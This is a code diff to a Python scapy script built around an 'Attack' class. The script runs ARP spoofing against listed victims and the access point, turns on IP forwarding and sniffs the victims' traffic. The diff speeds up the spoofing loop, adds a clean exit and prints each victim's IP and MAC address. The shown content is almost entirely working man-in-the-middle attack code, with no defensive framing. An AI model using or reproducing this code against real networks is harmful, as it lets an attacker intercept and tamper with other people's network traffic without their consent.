@@ -36,7 +36,7 @@ class Attack():
     def spoof(self, target_ip, spoof_ip): 
         target_mac = self.ip_mac[target_ip]
         packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-        scapy.send(packet,verbose=0)
+        scapy.send(packet)
 
     def enable_ip_route(self):
         file_path = "/proc/sys/net/ipv4/ip_forward"
@@ -71,18 +71,21 @@ class Attack():
                 self.spoof(v, self.ap)
                 self.spoof(self.ap, v)
                 scapy.sniff(filter="ether src "+self.ip_mac[v], prn=self.process_packet, iface=self.interfaces[1])
-            time.sleep(1)
+            time.sleep(0.1)
 
     def ret_arp_spoofing(self):
         for v in self.victim:
             self.restore(self.ap, v)
             self.restore(v, self.ap)
+        exit(0)
 
 attack = Attack()
 attack.get_ip()
 attack.get_mac(attack.network[1])
 attack.enable_ip_route()
-print(attack.ip_list, '\n', attack.ip_mac, '\n', attack.network)
+#print(attack.ip_list, '\n', attack.ip_mac, '\n', attack.network)
+for v in attack.victim:
+    print("IP :", v," Mac Address: ", attack.ip_mac[v])
 try:
     attack.arp_spoofing()
 except KeyboardInterrupt:
